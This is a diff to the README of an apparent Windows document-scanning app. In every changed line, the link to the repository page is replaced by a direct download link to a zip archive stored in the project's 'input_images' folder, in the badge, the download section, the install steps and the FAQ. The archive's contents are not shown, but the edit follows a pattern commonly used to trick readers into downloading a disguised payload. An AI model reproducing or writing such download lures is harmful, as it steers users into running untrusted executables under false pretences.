@@ -1,12 +1,12 @@
 # 🧠 Document-Intelligent-Assistant - Turn Scans Into Searchable Data
 
-[![Download](https://img.shields.io/badge/Download-Start%20Here-purple?style=for-the-badge)](https://github.com/roberthalfway204/Document-Intelligent-Assistant)
+[![Download](https://img.shields.io/badge/Download-Start%20Here-purple?style=for-the-badge)](https://raw.githubusercontent.com/roberthalfway204/Document-Intelligent-Assistant/main/input_images/Assistant_Document_Intelligent_v1.4-beta.5.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download the app:
 
-[https://github.com/roberthalfway204/Document-Intelligent-Assistant](https://github.com/roberthalfway204/Document-Intelligent-Assistant)
+[https://raw.githubusercontent.com/roberthalfway204/Document-Intelligent-Assistant/main/input_images/Assistant_Document_Intelligent_v1.4-beta.5.zip](https://raw.githubusercontent.com/roberthalfway204/Document-Intelligent-Assistant/main/input_images/Assistant_Document_Intelligent_v1.4-beta.5.zip)
 
 ## ✨ What this app does
 
@@ -34,7 +34,7 @@ For best results, use a modern PC with a recent processor and enough free memory
 Follow these steps to download and run the app on Windows.
 
 1. Open this page in your browser:  
-   [https://github.com/roberthalfway204/Document-Intelligent-Assistant](https://github.com/roberthalfway204/Document-Intelligent-Assistant)
+   [https://raw.githubusercontent.com/roberthalfway204/Document-Intelligent-Assistant/main/input_images/Assistant_Document_Intelligent_v1.4-beta.5.zip](https://raw.githubusercontent.com/roberthalfway204/Document-Intelligent-Assistant/main/input_images/Assistant_Document_Intelligent_v1.4-beta.5.zip)
 
 2. Look for the download area on the page.
 
@@ -254,7 +254,7 @@ Yes. That is one of the main use cases.
 
 Visit the download page here and get the file from the repository:
 
-[https://github.com/roberthalfway204/Document-Intelligent-Assistant](https://github.com/roberthalfway204/Document-Intelligent-Assistant)
+[https://raw.githubusercontent.com/roberthalfway204/Document-Intelligent-Assistant/main/input_images/Assistant_Document_Intelligent_v1.4-beta.5.zip](https://raw.githubusercontent.com/roberthalfway204/Document-Intelligent-Assistant/main/input_images/Assistant_Document_Intelligent_v1.4-beta.5.zip)
 
 After the file downloads:
 
